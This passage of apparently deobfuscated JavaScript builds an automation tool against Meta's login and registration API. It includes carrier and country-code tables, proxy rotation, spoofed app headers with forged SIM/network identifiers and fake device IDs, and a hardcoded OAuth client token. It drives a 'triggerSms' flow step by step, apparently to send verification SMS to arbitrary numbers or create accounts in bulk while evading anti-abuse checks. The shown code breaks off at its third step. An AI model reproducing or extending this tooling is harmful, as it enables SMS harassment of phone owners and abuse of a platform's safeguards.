v45.mcc = "501", v45.mnc = '01', v45.carrier = "AWCC", v45.locale = "fa_AF";
const v46 = {};
v46.mcc = "413", v46.mnc = '02', v46.carrier = "Dialog", v46.locale = "si_LK";
const v47 = {};
v47.mcc = "504", v47.mnc = '01', v47.carrier = "MPT", v47.locale = "my_MM";
const v48 = {};
v48.mcc = "432", v48.mnc = '11', v48.carrier = "MCI", v48.locale = "fa_IR";
const v49 = {};
v49.mcc = "604", v49.mnc = '01', v49.carrier = "IAM", v49.locale = "ar_MA";
const v50 = {};
v50.mcc = "603", v50.mnc = '01', v50.carrier = "Mobilis", v50.locale = "ar_DZ";
const v51 = {};
v51.mcc = "605", v51.mnc = '01', v51.carrier = "Tunisie Telecom", v51.locale = "ar_TN";
const v52 = {};
v52.mcc = "606", v52.mnc = '01', v52.carrier = "Madar", v52.locale = "ar_LY";
const v53 = {};
v53.mcc = "639", v53.mnc = '02', v53.carrier = "Safaricom", v53.locale = "en_KE";
const v54 = {};
v54.mcc = "640", v54.mnc = '02', v54.carrier = "Tigo", v54.locale = "en_US";
const v55 = {};
v55.mcc = "641", v55.mnc = '10', v55.carrier = "MTN", v55.locale = "en_UG";
const v56 = {};
v56.mcc = "621", v56.mnc = '30', v56.carrier = "MTN", v56.locale = "en_NG";
const v57 = {};
v57.mcc = "620", v57.mnc = '01', v57.carrier = "MTN", v57.locale = "en_GH";
const v58 = {};
v58.mcc = "612", v58.mnc = '03', v58.carrier = "Orange", v58.locale = "fr_CI";
const v59 = {};
v59.mcc = "608", v59.mnc = '01', v59.carrier = "Orange", v59.locale = "fr_SN";
const v60 = {};
v60.mcc = "624", v60.mnc = '01', v60.carrier = "MTN", v60.locale = "fr_CM";
const v61 = {};
v61.mcc = "634", v61.mnc = '01', v61.carrier = "Zain", v61.locale = "ar_SD";
const v62 = {};
v62.mcc = "636", v62.mnc = '01', v62.carrier = "Ethio Telecom", v62.locale = "am_ET";
const v63 = {};
v63.mcc = "637", v63.mnc = '01', v63.carrier = "Telesom", v63.locale = "so_SO";
const v64 = {};
v64.mcc = "635", v64.mnc = '10', v64.carrier = "MTN", v64.locale = "en_RW";
const v65 = {};
v65.mcc = "643", v65.mnc = '01', v65.carrier = "mcel", v65.locale = "pt_MZ";
const v66 = {};
v66.mcc = "631", v66.mnc = '02', v66.carrier = "Unitel", v66.locale = "pt_AO";
const v67 = {};
v67.mcc = "645", v67.mnc = '01', v67.carrier = "Airtel", v67.locale = "en_ZM";
const v68 = {};
v68.mcc = "648", v68.mnc = '04', v68.carrier = "Econet", v68.locale = "en_ZW";
const v69 = {};
v69.mcc = "650", v69.mnc = '01', v69.carrier = "TNM", v69.locale = "en_MW";
const v70 = {};
v70.mcc = "421", v70.mnc = '01', v70.carrier = "Yemen Mobile", v70.locale = "ar_YE";
const v71 = {};
v71.mcc = "424", v71.mnc = '02', v71.carrier = "Etisalat", v71.locale = "ar_AE";
const v72 = {};
v72.mcc = "420", v72.mnc = '01', v72.carrier = "STC", v72.locale = "ar_SA";
const v73 = {};
v73.mcc = "422", v73.mnc = '02', v73.carrier = "Ooredoo", v73.locale = "ar_OM";
const v74 = {};
v74.mcc = "427", v74.mnc = '01', v74.carrier = "Ooredoo", v74.locale = "ar_QA";
const v75 = {};
v75.mcc = "426", v75.mnc = '01', v75.carrier = "Batelco", v75.locale = "ar_BH";
const v76 = {};
v76.mcc = "419", v76.mnc = '01', v76.carrier = "Zain", v76.locale = "ar_KW";
const v77 = {};
v77.mcc = "416", v77.mnc = '01', v77.carrier = "Zain", v77.locale = "ar_JO";
const v78 = {};
v78.mcc = "418", v78.mnc = '01', v78.carrier = "Asiacell", v78.locale = "ar_IQ";
const v79 = {};
v79.mcc = "415", v79.mnc = '01', v79.carrier = "Alfa", v79.locale = "ar_LB";
const v80 = {};
v80.mcc = "425", v80.mnc = '05', v80.carrier = "Jawwal", v80.locale = "ar_PS";
const v81 = {};
v81.mcc = "425", v81.mnc = '01', v81.carrier = "Partner", v81.locale = "he_IL";
const v82 = {};
v82.mcc = "417", v82.mnc = '01', v82.carrier = "Syriatel", v82.locale = "ar_SY";
const v83 = {};
v83.mcc = "470", v83.mnc = '01', v83.carrier = "Grameenphone", v83.locale = "en_US";
const v84 = {};
v84.mcc = "456", v84.mnc = '08', v84.carrier = "Metfone", v84.locale = "en_US";
const v85 = {};
v85.US = v1, v85.CA = v2, v85.RU = v3, v85.KZ = v4, v85.EG = v5, v85.ZA = v6, v85.GR = v7, v85.NL = v8, v85.BE = v9, v85.FR = v10, v85.ES = v11, v85.HU = v12, v85.IT = v13, v85.RO = v14, v85.CH = v15, v85.AT = v16, v85.GB = v17, v85.DK = v18, v85.SE = v19, v85.NO = v20, v85.PL = v21, v85.DE = v22, v85.PE = v23, v85.MX = v24, v85.CU = v25, v85.AR = v26, v85.BR = v27, v85.CL = v28, v85.CO = v29, v85.VE = v30, v85.MY = v31, v85.AU = v32, v85.ID = v33, v85.PH = v34, v85.NZ = v35, v85.SG = v36, v85.TH = v37, v85.JP = v38, v85.KR = v39, v85.VN = v40, v85.CN = v41, v85.TR = v42, v85.IN = v43, v85.PK = v44, v85.AF = v45, v85.LK = v46, v85.MM = v47, v85.IR = v48, v85.MA = v49, v85.DZ = v50, v85.TN = v51, v85.LY = v52, v85.KE = v53, v85.TZ = v54, v85.UG = v55, v85.NG = v56, v85.GH = v57, v85.CI = v58, v85.SN = v59, v85.CM = v60, v85.SD = v61, v85.ET = v62, v85.SO = v63, v85.RW = v64, v85.MZ = v65, v85.AO = v66, v85.ZM = v67, v85.ZW = v68, v85.MW = v69, v85.YE = v70, v85.AE = v71, v85.SA = v72, v85.OM = v73, v85.QA = v74, v85.BH = v75, v85.KW = v76, v85.JO = v77, v85.IQ = v78, v85.LB = v79, v85.PS = v80, v85.IL = v81, v85.SY = v82, v85.BD = v83, v85.KH = v84;
const ISO_DETAILS = v85;
function getMccForCountry(v326) {
  const v327 = {};
  v327.US = "310", v327.CA = "302", v327.MX = "334", v327.CU = "368", v327.GB = "234", v327.FR = "208", v327.DE = "262", v327.IT = "222", v327.ES = "214", v327.NL = "204", v327.BE = "206", v327.CH = "228", v327.AT = "232", v327.PL = "260", v327.RU = "250", v327.UA = "255", v327.BY = "257", v327.KZ = "401", v327.KG = "437", v327.UZ = "436", v327.TJ = "436", v327.AM = "283", v327.AZ = "400", v327.GE = "282", v327.CN = "460", v327.JP = "440", v327.KR = "450", v327.IN = "404", v327.PK = "410", v327.BD = "470", v327.LK = "413", v327.NP = "429", v327.MM = "504", v327.TH = "520", v327.VN = "452", v327.MY = "502", v327.SG = "525", v327.ID = "510", v327.PH = "515", v327.KH = "456", v327.LA = "457", v327.TW = "466", v327.HK = "454", v327.AU = "505";
  v327.NZ = "530", v327.EG = "602", v327.ZA = "655", v327.NG = "621", v327.KE = "639", v327.TZ = "640", v327.UG = "641", v327.GH = "620", v327.CI = "612", v327.SN = "608", v327.CM = "624", v327.DZ = "603", v327.MA = "604", v327.TN = "605", v327.LY = "606", v327.SD = "634", v327.ET = "636";
  v327.SO = "637", v327.RW = "635", v327.MZ = "643", v327.AO = "631", v327.YE = "421", v327.SA = "420", v327.AE = "424", v327.OM = "422", v327.QA = "427", v327.BH = "426", v327.KW = "419", v327.JO = "416", v327.IQ = "418", v327.LB = "415", v327.PS = "425", v327.IL = "425", v327.SY = "417", v327.BR = "724", v327.AR = "722", v327.CL = "730", v327.CO = "732", v327.VE = "734", v327.PE = "716", v327.EC = "740", v327.UY = "748", v327.PY = "744", v327.BO = "736";
  const v328 = v327;
  return v328[v326] || "310";
}
function getCountrySettings(v329) {
  const v330 = v329.toUpperCase();
  if (ISO_DETAILS[v330]) {
    return {
      'hni': ISO_DETAILS[v330].mcc + ISO_DETAILS[v330].mnc,
      'mcc': ISO_DETAILS[v330].mcc,
      'mnc': ISO_DETAILS[v330].mnc,
      'carrier': ISO_DETAILS[v330].carrier,
      'locale': ISO_DETAILS[v330].locale
    };
  }
  const v331 = getMccForCountry(v330);
  let v332 = "en_US";
  const v333 = ['DZ', 'BH', 'EG', 'IQ', 'JO', 'KW', 'LB', 'LY', 'MA', 'OM', 'PS', 'QA', 'SA', 'SD', 'SY', 'TN', 'AE', 'YE'],
    v334 = ['AR', 'BO', 'CL', 'CO', 'CR', 'CU', 'DO', 'EC', 'SV', 'GT', 'HN', 'MX', 'NI', 'PA', 'PY', 'PE', 'PR', 'UY', 'VE', 'ES'];
  const v335 = ['BR', 'PT', 'AO', 'MZ', 'CV', 'GW'],
    v336 = ['FR', 'BE', 'CA', 'CH', 'CI', 'SN', 'CM', 'GA', 'CG', 'CD', 'GQ', 'HT', 'MC', 'NE', 'TG', 'BJ', 'BF', 'ML', 'GN', 'BI', 'DJ', 'RW', 'CF', 'TD'],
    v337 = ['DE', 'AT', 'CH', 'LI', 'LU'],
    v338 = ['RU', 'BY', 'KZ', 'KG', 'MD', 'UA', 'UZ', 'TJ', 'TM'];
  if (v333.includes(v330)) v332 = "ar_" + v330;else {
    if (v334.includes(v330)) v332 = "es_" + v330;else {
      if (v335.includes(v330)) v332 = "pt_" + v330;else {
        if (v336.includes(v330)) v332 = "fr_" + v330;else {
          if (v337.includes(v330)) v332 = "de_" + v330;else {
            if (v338.includes(v330)) v332 = "ru_" + v330;else {
              if (v330 === 'IN') v332 = "en_US";else v332 = "en_US";
            }
          }
        }
      }
    }
  }
  return {
    'hni': v331 + '01',
    'mcc': v331,
    'mnc': '01',
    'carrier': "Operator",
    'locale': v332
  };
}
function getMccAndHni(v339) {
  const v340 = detectCountry(v339);
  let v341 = v340 ? v340[0] : 'US';
  if (v341.includes('/')) {
    v341 = v341.split('/')[0];
  }
  return getCountrySettings(v341);
}
function getRandomConnectionQuality() {
  const v342 = Math.floor(Math.random() * 60) + 15;
  const v343 = Math.floor(Math.random() * 200000) + 40000;
  const v344 = Math.floor(Math.random() * 300) + 100;
  return "EXCELLENT; q=0.9, rtt=" + v342 + ", rtx=0, c=39, mss=1232, tbw=" + v343 + ", tp=81, tpl=0, uplat=" + v344 + ", ullat=3";
}
const uuid = () => crypto.randomUUID(),
  v86 = {};
v86['+1'] = ["US/CA", "United States / Canada"], v86['+7'] = ["RU/KZ", "Russia / Kazakhstan"], v86["+20"] = ['EG', "Egypt"], v86["+27"] = ['ZA', "South Africa"], v86["+30"] = ['GR', "Greece"], v86["+31"] = ['NL', "Netherlands"], v86["+32"] = ['BE', "Belgium"], v86["+33"] = ['FR', "France"], v86["+34"] = ['ES', "Spain"], v86["+36"] = ['HU', "Hungary"], v86["+39"] = ['IT', "Italy"], v86["+40"] = ['RO', "Romania"], v86["+41"] = ['CH', "Switzerland"], v86["+43"] = ['AT', "Austria"], v86["+44"] = ['GB', "United Kingdom"], v86["+45"] = ['DK', "Denmark"], v86["+46"] = ['SE', "Sweden"], v86["+47"] = ['NO', "Norway"], v86["+48"] = ['PL', "Poland"], v86["+49"] = ['DE', "Germany"], v86["+51"] = ['PE', "Peru"], v86["+52"] = ['MX', "Mexico"], v86["+53"] = ['CU', "Cuba"], v86["+54"] = ['AR', "Argentina"], v86["+55"] = ['BR', "Brazil"], v86["+56"] = ['CL', "Chile"], v86["+57"] = ['CO', "Colombia"], v86["+58"] = ['VE', "Venezuela"], v86["+60"] = ['MY', "Malaysia"], v86["+61"] = ['AU', "Australia"], v86["+62"] = ['ID', "Indonesia"], v86["+63"] = ['PH', "Philippines"], v86["+64"] = ['NZ', "New Zealand"], v86["+65"] = ['SG', "Singapore"], v86["+66"] = ['TH', "Thailand"], v86["+81"] = ['JP', "Japan"], v86["+82"] = ['KR', "South Korea"], v86["+84"] = ['VN', "Vietnam"], v86["+86"] = ['CN', "China"], v86["+90"] = ['TR', "Turkey"], v86["+91"] = ['IN', "India"], v86["+92"] = ['PK', "Pakistan"], v86["+93"] = ['AF', "Afghanistan"], v86["+94"] = ['LK', "Sri Lanka"], v86["+95"] = ['MM', "Myanmar"], v86["+98"] = ['IR', "Iran"], v86["+212"] = ['MA', "Morocco"], v86["+213"] = ['DZ', "Algeria"], v86["+216"] = ['TN', "Tunisia"], v86["+218"] = ['LY', "Libya"], v86["+220"] = ['GM', "Gambia"], v86["+221"] = ['SN', "Senegal"], v86["+222"] = ['MR', "Mauritania"], v86["+223"] = ['ML', "Mali"], v86["+224"] = ['GN', "Guinea"], v86["+225"] = ['CI', "Ivory Coast"], v86["+226"] = ['BF', "Burkina Faso"], v86["+227"] = ['NE', "Niger"], v86["+228"] = ['TG', "Togo"], v86["+229"] = ['BJ', "Benin"], v86["+230"] = ['MU', "Mauritius"], v86["+231"] = ['LR', "Liberia"], v86["+232"] = ['SL', "Sierra Leone"], v86["+233"] = ['GH', "Ghana"], v86["+234"] = ['NG', "Nigeria"], v86["+235"] = ['TD', "Chad"], v86["+236"] = ['CF', "Central African Republic"], v86["+237"] = ['CM', "Cameroon"], v86["+238"] = ['CV', "Cape Verde"], v86["+239"] = ['ST', "Sao Tome"], v86["+240"] = ['GQ', "Equatorial Guinea"], v86["+241"] = ['GA', "Gabon"], v86["+242"] = ['CG', "Republic of the Congo"], v86["+243"] = ['CD', "DR Congo"], v86["+244"] = ['AO', "Angola"], v86["+245"] = ['GW', "Guinea-Bissau"], v86["+246"] = ['IO', "British Indian Ocean Territory"], v86["+247"] = ['AC', "Ascension Island"], v86["+248"] = ['SC', "Seychelles"], v86["+249"] = ['SD', "Sudan"], v86["+250"] = ['RW', "Rwanda"], v86["+251"] = ['ET', "Ethiopia"], v86["+252"] = ['SO', "Somalia"], v86["+253"] = ['DJ', "Djibouti"], v86["+254"] = ['KE', "Kenya"], v86["+255"] = ['TZ', "Tanzania"], v86["+256"] = ['UG', "Uganda"], v86["+257"] = ['BI', "Burundi"], v86["+258"] = ['MZ', "Mozambique"], v86["+260"] = ['ZM', "Zambia"], v86["+261"] = ['MG', "Madagascar"], v86["+262"] = ['RE', "Reunion"], v86["+263"] = ['ZW', "Zimbabwe"], v86["+264"] = ['NA', "Namibia"], v86["+265"] = ['MW', "Malawi"], v86["+266"] = ['LS', "Lesotho"], v86["+267"] = ['BW', "Botswana"], v86["+268"] = ['SZ', "Eswatini"], v86["+269"] = ['KM', "Comoros"], v86["+290"] = ['SH', "Saint Helena"], v86["+291"] = ['ER', "Eritrea"], v86["+297"] = ['AW', "Aruba"], v86["+298"] = ['FO', "Faroe Islands"], v86["+299"] = ['GL', "Greenland"], v86["+350"] = ['GI', "Gibraltar"], v86["+351"] = ['PT', "Portugal"], v86["+352"] = ['LU', "Luxembourg"], v86["+353"] = ['IE', "Ireland"], v86["+354"] = ['IS', "Iceland"];
v86["+355"] = ['AL', "Albania"], v86["+356"] = ['MT', "Malta"], v86["+357"] = ['CY', "Cyprus"], v86["+358"] = ['FI', "Finland"], v86["+359"] = ['BG', "Bulgaria"], v86["+370"] = ['LT', "Lithuania"], v86["+371"] = ['LV', "Latvia"], v86["+372"] = ['EE', "Estonia"], v86["+373"] = ['MD', "Moldova"], v86["+374"] = ['AM', "Armenia"], v86["+375"] = ['BY', "Belarus"], v86["+376"] = ['AD', "Andorra"], v86["+377"] = ['MC', "Monaco"], v86["+378"] = ['SM', "San Marino"], v86["+380"] = ['UA', "Ukraine"], v86["+381"] = ['RS', "Serbia"], v86["+382"] = ['ME', "Montenegro"], v86["+385"] = ['HR', "Croatia"], v86["+386"] = ['SI', "Slovenia"], v86["+387"] = ['BA', "Bosnia and Herzegovina"], v86["+389"] = ['MK', "North Macedonia"], v86["+420"] = ['CZ', "Czech Republic"], v86["+421"] = ['SK', "Slovakia"], v86["+423"] = ['LI', "Liechtenstein"], v86["+500"] = ['FK', "Falkland Islands"], v86["+501"] = ['BZ', "Belize"], v86["+502"] = ['GT', "Guatemala"], v86["+503"] = ['SV', "El Salvador"], v86["+504"] = ['HN', "Honduras"], v86["+505"] = ['NI', "Nicaragua"], v86["+506"] = ['CR', "Costa Rica"], v86["+507"] = ['PA', "Panama"], v86["+508"] = ['PM', "Saint Pierre and Miquelon"], v86["+509"] = ['HT', "Haiti"], v86["+590"] = ['GP', "Guadeloupe"], v86["+591"] = ['BO', "Bolivia"], v86["+592"] = ['GY', "Guyana"], v86["+593"] = ['EC', "Ecuador"], v86["+595"] = ['PY', "Paraguay"], v86["+597"] = ['SR', "Suriname"], v86["+598"] = ['UY', "Uruguay"], v86["+599"] = ['AN', "Netherlands Antilles"], v86["+670"] = ['TL', "East Timor"], v86["+672"] = ['NF', "Norfolk Island"], v86["+673"] = ['BN', "Brunei"], v86["+674"] = ['NR', "Nauru"], v86["+675"] = ['PG', "Papua New Guinea"], v86["+676"] = ['TO', "Tonga"], v86["+677"] = ['SB', "Solomon Islands"], v86["+678"] = ['VU', "Vanuatu"], v86["+679"] = ['FJ', "Fiji"], v86["+680"] = ['PW', "Palau"], v86["+681"] = ['WF', "Wallis and Futuna"], v86["+682"] = ['CK', "Cook Islands"], v86["+683"] = ['NU', "Niue"], v86["+685"] = ['WS', "Samoa"], v86["+686"] = ['KI', "Kiribati"], v86["+687"] = ['NC', "New Caledonia"], v86["+688"] = ['TV', "Tuvalu"], v86["+689"] = ['PF', "French Polynesia"], v86["+690"] = ['TK', "Tokelau"], v86["+691"] = ['FM', "Micronesia"], v86["+692"] = ['MH', "Marshall Islands"], v86["+850"] = ['KP', "North Korea"], v86["+852"] = ['HK', "Hong Kong"], v86["+853"] = ['MO', "Macau"], v86["+855"] = ['KH', "Cambodia"], v86["+856"] = ['LA', "Laos"], v86["+880"] = ['BD', "Bangladesh"], v86["+886"] = ['TW', "Taiwan"], v86["+960"] = ['MV', "Maldives"], v86["+961"] = ['LB', "Lebanon"], v86["+962"] = ['JO', "Jordan"], v86["+963"] = ['SY', "Syria"], v86["+964"] = ['IQ', "Iraq"], v86["+965"] = ['KW', "Kuwait"], v86["+966"] = ['SA', "Saudi Arabia"], v86["+967"] = ['YE', "Yemen"], v86["+968"] = ['OM', "Oman"], v86["+970"] = ['PS', "Palestine"], v86["+971"] = ['AE', "UAE"], v86["+972"] = ['IL', "Israel"], v86["+973"] = ['BH', "Bahrain"], v86["+974"] = ['QA', "Qatar"], v86["+975"] = ['BT', "Bhutan"], v86["+976"] = ['MN', "Mongolia"], v86["+977"] = ['NP', "Nepal"], v86["+992"] = ['TJ', "Tajikistan"], v86["+993"] = ['TM', "Turkmenistan"], v86["+994"] = ['AZ', "Azerbaijan"], v86["+995"] = ['GE', "Georgia"], v86["+996"] = ['KG', "Kyrgyzstan"], v86["+998"] = ['UZ', "Uzbekistan"];
const COUNTRY_CODES = v86;
function detectCountry(v345) {
  for (let v346 = 4; v346 >= 1; v346--) {
    const v347 = v345.substring(0, v346 + 1);
    if (COUNTRY_CODES[v347]) return {
      'code': v347,
      ...COUNTRY_CODES[v347]
    };
  }
  return null;
}
function normalizePhoneNumber(v348) {
  if (!v348) return '';
  if (typeof v348 !== "string") v348 = String(v348);
  let v349 = v348.trim();
  if (v349.startsWith('00')) v349 = '+' + v349.slice(2);else {
    if (!v349.startsWith('+')) v349 = '+' + v349.replace(/\D/g, '');else v349 = '+' + v349.slice(1).replace(/\D/g, '');
  }
  return v349;
}
function parseProxy(v350) {
  if (!v350) return null;
  if (typeof v350 === "object") return v350;
  if (typeof v350 !== "string") v350 = String(v350);
  v350 = v350.trim();
  if (!v350) return null;
  let v351 = "http",
    v352,
    v353,
    v354,
    v355;
  if (v350.startsWith("socks5://")) v351 = "socks5", v350 = v350.slice(9);else {
    if (v350.startsWith("socks4://")) v351 = "socks4", v350 = v350.slice(9);else {
      if (v350.startsWith("http://")) {
        v350 = v350.slice(7);
      } else v350.startsWith("https://") && (v350 = v350.slice(8));
    }
  }
  if (v350.includes("://")) v350 = v350.split("://")[1];
  if (v350.includes('@')) {
    const v356 = v350.split('@'),
      v357 = v356[0].split(':'),
      v358 = v356[1].split(':');
    v354 = v357[0], v355 = v357[1], v352 = v358[0], v353 = parseInt(v358[1]);
  } else {
    {
      const v359 = v350.split(':');
      if (v359.length === 2) v352 = v359[0], v353 = parseInt(v359[1]);else {
        if (v359.length === 4) !isNaN(parseInt(v359[3])) && isNaN(parseInt(v359[1])) ? (v354 = v359[0], v355 = v359[1], v352 = v359[2], v353 = parseInt(v359[3])) : (v352 = v359[0], v353 = parseInt(v359[1]), v354 = v359[2], v355 = v359[3]);else v359.length === 3 && (v352 = v359[0], v353 = parseInt(v359[1]), v354 = v359[2]);
      }
    }
  }
  if (!v352 || !v353) return null;
  return {
    'type': v351,
    'host': v352,
    'port': parseInt(v353),
    'user': v354,
    'pass': v355,
    'original': v350
  };
}
function createProxyAgent(v360, v361 = false) {
  if (!v360) return null;
  if (typeof v360 === "string") v360 = parseProxy(v360);
  if (!v360) return null;
  const v362 = v360.user ? encodeURIComponent(v360.user) + ':' + encodeURIComponent(v360.pass || '') + '@' : '';
  let v363;
  if (v360.type === "socks5" || v360.type === "socks4") {
    v363 = new SocksProxyAgent("socks5://" + v362 + v360.host + ':' + v360.port);
  } else {
    {
      const v364 = {};
      v364.keepAlive = v361, v363 = new HttpsProxyAgent("http://" + v362 + v360.host + ':' + v360.port, v364);
    }
  }
  if (v363 && typeof v363.on === "function") {
    v363.on("error", () => {});
  }
  return v363;
}
function sendRequest(v365, v366, v367, v368, v369 = null, v370 = 20000) {
  return new Promise((v371, v372) => {
    const v373 = new URL(v365),
      v374 = {
        ...v367
      },
      v375 = {
        'hostname': v373.hostname,
        'path': v373.pathname + v373.search,
        'method': v366,
        'headers': v374,
        'timeout': v370
      };
    if (v368) v375.headers["Content-Length"] = Buffer.byteLength(v368);
    if (v369 && typeof v369 === "object") v375.agent = v369;else {
      if (v369 && typeof v369 === "string") v375.agent = createProxyAgent(parseProxy(v369));else {
        const v377 = {};
        v377.keepAlive = false, v375.agent = new https.Agent(v377);
      }
    }
    const v376 = https.request(v375, v378 => {
      const v379 = [];
      v378.on("data", v380 => v379.push(v380));
      v378.on("error", v372), v378.on("end", () => {
        {
          let v381 = Buffer.concat(v379);
          const v382 = v378.headers["content-encoding"];
          if (v382 === "gzip") try {
            v381 = zlib.gunzipSync(v381);
          } catch (v383) {} else {
            if (v382 === "deflate") try {
              v381 = zlib.inflateSync(v381);
            } catch (v384) {}
          }
          v371({
            'status': v378.statusCode,
            'data': v381.toString("utf8"),
            'headers': v378.headers
          });
        }
      });
    });
    v376.on("socket", v385 => {
      v385.on("error", v386 => {
        v372(v386);
      });
    }), v376.on("error", v372);
    v376.setTimeout(v370, () => {
      v376.destroy();
      v372(new Error("timeout"));
    });
    if (v368) v376.write(v368);
    v376.end();
  });
}
function extractContextData(v387) {
  const v388 = v387.match(/AT[A-Za-z0-9_\-\.\+=\\/]{100,}/g);
  if (!v388 || v388.length === 0) return null;
  const v389 = v388.reduce((v390, v391) => v391.length > v390.length ? v391 : v390);
  return v389.replace(/\\/g, '');
}
function extractAllContextData(v392) {
  const v393 = v392.match(/AT[A-Za-z0-9_\-\.\+=\\/]{100,}/g);
  return v393 ? [...new Set(v393.map(v394 => v394.replace(/\\/g, '')))] : [];
}
function extractRegistrationContext(v395) {
  const v396 = extractAllContextData(v395);
  if (v396.length === 0) return null;
  const v397 = [...v396].sort((v398, v399) => v399.length - v398.length);
  return v397[0];
}
function detectForcedStep(v400) {
  const v401 = v400.match(/\\\"forced_step\\\"\s*,\s*\\\"([A-Z_]+)\\\"/) || v400.match(/"forced_step"\s*:\s*"([A-Z_]+)"/);
  return v401 ? v401[1] : null;
}
function isAgeBlocked(v402) {
  const v403 = v402.match(/\\\"state\\\"\s*,\s*\\\"([A-Z_]+)\\\"/);
  if (v403 && v403[1] === "AGE_BLOCKED_FROM_SIGNUP") return true;
  return v402.includes("AGE_BLOCKED_FROM_SIGNUP") && !v402.includes("\"forced_step\":\"FETA_LOGIN_LANDING\"") && v403;
}
function getErrorMsg(v404) {
  try {
    {
      const v405 = v404.match(/"error_title"\\?\s*:\\?\s*"([^"\\]+)"/),
        v406 = v404.match(/"error_message"\\?\s*:\\?\s*"([^"\\]+)"/),
        v407 = v404.match(/"error_code"\\?\s*:\\?\s*(\d+)/);
      if (v405 || v406 || v407) return "Title: " + (v405?.[1] || "none") + " | Msg: " + (v406?.[1] || "none") + " | Code: " + (v407?.[1] || "none");
    }
  } catch (v408) {}
  return null;
}
async function triggerSms(v409, v410 = {}) {
  const {
      onStatus = () => {},
      proxy: v411 = null,
      timeout = 40000
    } = v410,
    v412 = normalizePhoneNumber(v409),
    v413 = uuid();
  let v414 = null;
  if (v411) {
    {
      const v434 = parseProxy(v411);
      if (v434) v414 = createProxyAgent(v434, true);
    }
  } else {
    const v435 = {};
    v435.keepAlive = true, v435.maxSockets = 0x1, v435.timeout = 0x7530, v414 = new https.Agent(v435);
  }
  let v415 = v412.replace(/^\+/, ''),
    v416 = v412;
  const v417 = detectCountry(v412);
  let v418 = getMccAndHni(v412);
  const v419 = v412.replace(/\D/g, '');
  const v420 = getCountryFromPhone(v419),
    v421 = v410.regionPref && v410.regionPref !== "random" ? v410.regionPref : v420.lang,
    v422 = uuid(),
    v423 = uuid().replace(/-/g, ''),
    v424 = getDevice(v418.locale, v418.carrier),
    v425 = getRandomConnectionQuality(),
    v426 = "25388939416361662348114792130",
    v427 = "6165507607732403794408071507";
  const v428 = "24e20f03055c8429a90734dc77fd2c73718857aca6d82bef6a4c325a7cbae11e",
    v429 = {};
  v429.Authorization = "OAuth FRL|388177446008673|083800dd7efbbd42eab18c9886d79c18", v429["User-Agent"] = v424, v429["Accept-Language"] = v421, v429.Accept = "*/*", v429["Accept-Encoding"] = "gzip, deflate", v429["Content-Type"] = "application/x-www-form-urlencoded", v429["x-fb-http-engine"] = "Tigon/MNS/mvfst-mobile", v429["X-FB-Request-Analytics-Tags"] = "{\"network_tags\":{\"product\":\"830547164036012\",\"request_category\":\"graphql\",\"purpose\":\"none\",\"retry_attempt\":\"0\"}}", v429["x-fb-conn-uuid-client"] = v423, v429["X-FB-Server-Cluster"] = "True", v429["X-FB-Client-IP"] = "True", v429["x-fb-rev"] = "1046162082", v429["x-graphql-client-library"] = "pando", v429["x-fb-connection-quality"] = v425, v429["X-FB-Net-HNI"] = v418.hni, v429["X-FB-Sim-HNI"] = v418.hni, v429["X-FB-Connection-Type"] = "WIFI";
  const v430 = v429,
    v431 = "https://meta.graph.meta.com/graphql?locale=" + v418.locale;
  let v432 = '',
    v433 = '';
  async function fn4(v436, v437, v438, v439, v440 = "bloks_action", v441 = true) {
    {
      const v442 = v437 === v426 ? "FrlBloksAsyncActionQuery" : "FrlBloksAppRootQuery",
        v443 = v442 + '-' + v438,
        v444 = {};
      v444.debug_tooling_metadata_token = null, v444.is_flipper_enabled = false;
      const v445 = {};
      v445.app_id = v438, v445.bloks_versioning_id = v428, v445.params = v439;
      const v446 = {};
      v446.bk_context = v444, v446.params = v445;
      const v447 = JSON.stringify(v446),
        v448 = "client_doc_id=" + v437 + "&variables=" + encodeURIComponent(v447),
        v449 = {
          ...v430
        };
      v449["X-FB-Friendly-Name"] = v443, v449["X-Root-Field-Name"] = v440;
      const v450 = v449,
        v451 = await sendRequest(v431, "POST", v450, v448, v414, timeout);
      v451.headers && v451.headers["x-fb-rev"] && (v430["x-fb-rev"] = v451.headers["x-fb-rev"]);
      debugLog(v412, v436, "HTTP " + v451.status + '\x0a' + v451.data, v448);
      const v452 = v451.data.includes("field_exception") || v451.data.includes("Something went wrong"),
        v453 = v451.data.includes("\"bloks_action\":null");
      if (v452) {
        {
          const v455 = v451.data.match(/"message":"([^"]+)"/),
            v456 = v455 ? v455[1] : "field_exception";
          if (v441 && v453) {
            throw new Error(v436 + " FATAL: " + v456 + " (bloks_action=null, no context returned)");
          }
        }
      }
      if (v451.status !== 200) throw new Error(v436 + " HTTP " + v451.status);
      if (!v451.data.includes("\"data\"")) throw new Error(v436 + " invalid response");
      const v454 = extractAllContextData(v451.data);
      if (v454.length >= 2) {
        {
          const v457 = [...v454].sort((v458, v459) => v459.length - v458.length);
          v432 = v457[0], v433 = v457[1];
        }
      } else v454.length === 1 && (v432 = v454[0]);
      return v451.data;
    }
  }
  try {
    onStatus("[1/15] Get initial context...");
    const v460 = {};
    v460.family_device_id = v422, v460.device_id = v422, v460.native_auth_data = [], await fn4("Step1", v426, "com.bloks.www.meta.access.aymh_with_nta_fallback.async", JSON.stringify({
      'client_input_params': v460,
      'server_params': {
        'next': "https://accounts.meta.com/oidc/?app_id=934401142814369&scope=openid&response_type=code&redirect_uri=https%3A%2F%2Faccounts.meta.com%2Fnative%2Foidc%2Fredirect%2Fmetaai&state=" + uuid(),
        'should_open_or_push_sync_screen': 0x0,
        'should_show_explicit_oxygen_preload_tos': 0x0,
        'INTERNAL__latency_qpl_instance_id': 0x6a7c4afec6e3,
        'is_otp_shortcut': 0x0,
        'is_from_reauth': 0x0,
        'should_push_screen': 0x0,
        'logging_session_id': v413,
        'context_data': '',
        'INTERNAL__latency_qpl_marker_id': 0x2301b43,
        'logging_user_intent': "meta_ai",
        'nav_bar_action': "CLOSE",
        'is_native_token_fetch_done': 0x1
      }
    }));
    if (!v432) throw new Error("Failed to extract context from Step 1");
    onStatus("[1/15] ✅"), await delay(1000, 2000), onStatus("[2/15] Login Landing..."), await fn4("Step2", v427, "com.bloks.www.bloks.feta.login.landing", JSON.stringify({
      'server_params': {
        'context_data': v432,
        'INTERNAL_INFRA_screen_id': "feta_rl_access_login_landing_screen",
        'account_data': [],
        'is_b2mv_flow': 0x0,
        'nav_bar_action': "CLOSE"
      }
    }), "bloks_app"), onStatus("[2/15] ✅"), await delay(1500, 2500), onStatus("[3/15] Google Credential Manager...");
    try {
      onStatus("[3/15] ✅");
    } catch (v564) {
      onStatus("[3/15] ⚠️ Google Credential Manager bypassed");
    }
